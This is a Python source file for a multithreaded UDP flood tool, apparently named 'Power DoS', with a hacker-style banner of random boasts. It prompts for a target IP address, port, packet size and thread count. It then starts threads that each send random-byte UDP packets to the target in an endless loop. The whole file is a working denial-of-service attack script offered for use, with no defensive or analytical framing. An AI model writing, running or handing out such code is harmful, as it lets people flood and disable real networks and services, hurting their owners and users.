try:
    import threading
    import socket
    import random
    import time
    import sys
    import os

except KeyboardInterrupt:
    print('\033[1m\033[93m[!] Exiting.')
    sys.exit()

except ModuleNotFoundError:
    print('\033[1m\033[93m[!] Missing threading. Install it!!!! ')
    sys.exit()

if sys.version_info[0] < 3:
    print("\033[1m\033[93m[!] Please run the tool using Python 3")
    sys.exit()

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def random_phrase():
    ppl = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy", "marreta cabeça de rato", "S4SUK3"]
    phrase = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA", "hacked FBI", "hacked you", "is looking 4 u", "is right behind you", "has hype"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    cls()
    print(f"""\033[1;31m
         ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
        █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
        ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
           █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
         ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
        █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
        ▐                                 ▐                      ▐ {random_phrase()}

        \033[2;33mVersion: 1.1 \t Coded by Leonardo Sasaki\n
        """)

def DoS(ip, port, size, index):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
                sock.sendto(random._urandom(size), (ip, port))
                print(f"\033[1;32m[THREAD {index}] \xBB {size} bytes sent to {ip}")

def main():
    try:
        banner()
        target_ip       = input("\033[2;32mEnter the target ip \xBB ") if len(sys.argv) < 2 else sys.argv[1]
        target_port     = int(input("\033[2;32mEnter the target port \xBB ")) if len(sys.argv) < 3 else int(sys.argv[2])
        target_size     = int(input("\033[2;32mEnter the packet size \xBB ")) if len(sys.argv) < 4 else int(sys.argv[3])
        thread_count    = int(input("\033[2;32mEnter how many threads to use \xBB ")) if len(sys.argv) < 5 else int(sys.argv[4])
    except KeyboardInterrupt:
        cls()
        print("[!] Shutdown...")
        sys.exit()

    if target_port > 65535 or target_port < 1:
        print("\n\033[1;31m[ERROR] \xBB Please, choose a port between 1 and 65535")
        sys.exit(1)

    if target_size > 65500 or target_size < 1:
        print("\n\033[1;31m[ERROR] \xBB Please, choose a size between 1 and 65500")
        sys.exit(1)

    for i in range(thread_count):
        try:
            t = threading.Thread(target=DoS, args=(target_ip, target_port, target_size, i))
            t.start()
        except:
            print(f"\n\033[1;31m[ERRO] \xBB An error ocurred initializing thread {i} (Did you enter too much threads?)")

if __name__ == "__main__":
    main()